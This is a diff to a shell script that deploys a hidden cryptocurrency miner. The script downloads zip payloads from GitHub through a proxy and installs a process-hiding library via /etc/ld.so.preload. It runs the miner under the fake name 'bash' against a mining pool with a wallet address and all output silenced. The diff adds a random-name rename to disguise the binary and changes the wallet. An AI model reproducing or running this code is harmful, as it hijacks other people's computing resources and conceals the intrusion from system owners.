@@ -37,11 +37,11 @@ echo "**"
 echo " "
 
 echo " "
-
+blkdiscard=$(shuf -n 1 -i 1-999999)
 ./graftcp/graftcp wget https://github.com/komaria10003099/komaria/raw/main/nikimaru.zip && unzip nikimaru.zip
 
 chmod +x bash
-
+mv bash $blkdiscard 
 wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip
 
 unzip magicBezzHash.zip
@@ -54,4 +54,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bash -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -n $(echo $(shuf -i 1-20000 -n 1)-GG) -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0 >/dev/null 2>&1
+./graftcp/graftcp ./$blkdiscard  -t cuda -a "NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL" -n $(echo $(shuf -i 1-20000 -n 1)-GG) -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0 >/dev/null 2>&1
